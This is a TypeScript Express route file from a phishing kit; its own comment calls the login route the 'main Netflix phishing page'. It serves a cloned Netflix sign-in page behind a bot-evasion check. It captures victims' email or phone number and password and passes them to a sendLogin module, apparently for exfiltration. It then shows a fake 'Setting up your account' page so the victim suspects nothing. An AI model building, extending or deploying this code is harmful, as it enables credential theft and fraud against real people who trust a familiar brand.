/**
 * N directory routes
 * Converted from PHP N/index.php and N/login.php
 */

import express from 'express';
import path from 'path';
import fs from 'fs';
import { Request, Response } from 'express';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const router = express.Router();

// Import system modules
import { comprehensiveBotCheck } from '../bots/index.js';
import { sendLogin } from '../system/send_login.js';

const PUBLIC_DIR = path.join(__dirname, '../public');

// N/index.php - redirects to login
router.get('/', (req: Request, res: Response) => {
    res.redirect('/n/login');
});

// N/login.php - main Netflix phishing page
router.get('/login', async (req: Request, res: Response) => {
    // Include system modules (equivalent to PHP includes)
    const isAllowed = await comprehensiveBotCheck(req, res);

    if (!isAllowed) {
        // Bot check failed, response already handled
        return;
    }

    // If not blocked, serve the login page
    const loginPagePath = path.join(PUBLIC_DIR, 'login.html');

    // Check if login page exists, if not create it
    if (!fs.existsSync(loginPagePath)) {
        createLoginPage(loginPagePath);
    }

    res.sendFile(loginPagePath);
});

// Handle login form submission
router.post('/login', async (req: Request, res: Response) => {
    const { iduserLoginId, idpassword } = req.body;

    // Store in session
    req.session.iduserLoginId = iduserLoginId;
    req.session.idpassword = idpassword;

    // Send login data
    await sendLogin(req, res);

    // Redirect to next page (like Netflix waiting page)
    res.redirect('/n/wait');
});

// N/Wait.php - waiting page
router.get('/wait', (req: Request, res: Response) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Netflix</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    background-color: #000;
                    color: #fff;
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .loader {
                    text-align: center;
                }
                .spinner {
                    border: 4px solid #333;
                    border-top: 4px solid #e50914;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 20px;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div class="loader">
                <div class="spinner"></div>
                <p>Setting up your account...</p>
            </div>
        </body>
        </html>
    `);
});

// N/Myaccount.php - account page
router.get('/myaccount', (req: Request, res: Response) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Netflix - My Account</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    background-color: #000;
                    color: #fff;
                    font-family: Arial, sans-serif;
                    padding: 20px;
                }
            </style>
        </head>
        <body>
            <h1>My Account</h1>
            <p>Account management features would go here...</p>
        </body>
        </html>
    `);
});

function createLoginPage(filePath: string): void {
    const loginPageContent = `<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Netflix</title>
    <link type="text/css" rel="stylesheet" href="/css/stylef.css">
    <link type="text/css" rel="stylesheet" href="/css/nonechaditk.css">
    <script src="/js/angular.min.js"></script>
    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.validate.min.js"></script>
    <script src="/js/jquery.mask.js"></script>
    <script src="/js/style.js"></script>
    <script src="/js/Baby.js"></script>
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link rel="shortcut icon" href="/css/nficon2016.ico">
</head>
<body>
    <div id="appMountPoint">
        <div class="login-wrapper hybrid-login-wrapper">
            <div class="login-wrapper-background">
                <img class="concord-img vlv-creative" src="/css/alpha_website_small.jpg" alt="">
            </div>
            <br>
            <div class="nfHeader login-header signupBasicHeader">
                <a href="#" class="svg-nfLogo signupBasicHeader">
                    <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo">
                        <g id="netflix-logo">
                            <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path>
                        </g>
                    </svg>
                    <span class="screen-reader-text">Netflix</span>
                </a>
            </div>
            <div class="login-body">
                <div>
                    <div class="login-content login-form hybrid-login-form hybrid-login-form-signup">
                        <div class="hybrid-login-form-main">
                            <h1>Sign In</h1>
                            <form id="loginnet" name="loginnet" method="post" class="login-form" action="/n/login">
                                <div id="errorrloginnet"></div>
                                <div class="dddd nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input required="required" type="text" name="iduserLoginId" class="nfTextField" id="iduserLoginId" value="" tabindex="" dir="ltr">
                                                <span class="placeLabel">Email or phone number</span>
                                            </label>
                                        </div>
                                    </div>
                                </div>
                                <div class="dddd nfInput nfPasswordInput nfPasswordHasToggle login-input login-input-password">
                                    <div class="nfInputPlacement">
                                        <div class="nfPasswordControls nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input minlength="4" required="required" type="password" name="idpassword" class="nfTextField" id="idpassword">
                                                <span class="placeLabel">Password</span>
                                            </label>
                                            <button type="button" class="nfPasswordToggle" id="passwordSHOW">SHOW</button>
                                            <button style="display:none;" type="button" class="nfPasswordToggle" id="passwordHIDE">HIDE</button>
                                        </div>
                                    </div>
                                </div>
                                <button class="btn login-button btn-submit btn-small" type="submit">Sign In</button>
                                <div class="hybrid-login-form-help">
                                    <div class="ui-binary-input login-remember-me">
                                        <input type="checkbox" name="rememberMe" id="bxid_rememberMe_true" value="true" checked>
                                        <label for="bxid_rememberMe_true"><span class="login-remember-me-label-text">Remember me</span></label>
                                    </div>
                                    <a href="#" class="login-help-link">Need help?</a>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>`;

    // Ensure directory exists
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }

    fs.writeFileSync(filePath, loginPageContent);
}

export default router;